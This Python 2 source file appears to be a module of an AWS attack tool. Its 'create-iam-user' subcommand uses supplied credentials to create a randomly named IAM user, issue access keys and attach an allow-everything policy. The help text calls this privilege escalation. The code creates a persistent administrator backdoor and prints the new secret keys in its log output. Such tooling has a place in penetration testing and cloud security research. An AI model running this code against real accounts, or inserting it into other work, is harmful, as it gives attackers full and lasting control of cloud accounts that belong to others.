import string
import random
import logging

from boto.iam import IAMConnection

from core.common_arguments import add_credential_arguments


ALL_POLICY = '''\
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }
  ]
}
'''
SUCCESS = '''\
Created user %s with ALL PRIVILEGES. User information:
    * Access key: %s
    * Secret key: %s
    * Policy name: %s
'''

def cmd_arguments(subparsers):
    #
    # create-iam-user subcommand help
    #
    _help = 'Use the current credentials to create a user with all AWS'\
            ' privileges. When the current user has iam:* but other'\
            ' permissions are restricted, this acts like a privilege'\
            ' escalation.'
    parser = subparsers.add_parser('create-iam-user', help=_help)
    
    add_credential_arguments(parser)
    
    return subparsers


def cmd_handler(args):
    '''
    Main entry point for the sub-command.
    
    :param args: The command line arguments as parsed by argparse
    '''
    logging.debug('Starting create-iam-user')
    
    create_iam_user(args.access_key, args.secret_key, args.token)
    
def create_iam_user(access_key, secret_key, token):
    '''
    Connect to IAM and try to create a new user with all privileges.
    '''
    try:
        conn = IAMConnection(aws_access_key_id=access_key,
                             aws_secret_access_key=secret_key,
                             security_token=token)
    except Exception, e:
        logging.critical('Failed to connect to IAM: "%s"' % e.error_message)
        logging.debug('Account has no access to IAM')
        return
    
    user_name = ''.join([random.choice(string.ascii_lowercase) for _ in xrange(9)])
    
    logging.debug('Trying to create user "%s"' % user_name)
    
    try:
        conn.create_user(user_name)
    except Exception, e:
        logging.critical('Failed to create user: "%s"' % e.error_message)
        return
    
    logging.debug('User "%s" created' % user_name)
    logging.debug('Trying to create user "%s" access keys' % user_name)
    
    try:
        credentials = conn.create_access_key(user_name=user_name)
    except Exception, e:
        logging.critical('Failed to create user access key: "%s"' % e.error_message)
        return
        
    key = credentials['create_access_key_response']['create_access_key_result']['access_key']
    api_key = key['access_key_id']
    api_secret = key['secret_access_key']

    msg = 'Created access keys for user %s. Access key: %s , access secret: %s'
    logging.debug(msg % (user_name, api_key, api_secret))
    
    policy_name = 'nimbostratus%s' % user_name
    
    try:
        conn.put_user_policy(user_name, policy_name, ALL_POLICY)
    except Exception, e:
        logging.critical('Failed to add user policy: "%s"' % e.error_message)
        return
        
    logging.info(SUCCESS % (user_name, api_key, api_secret, policy_name))
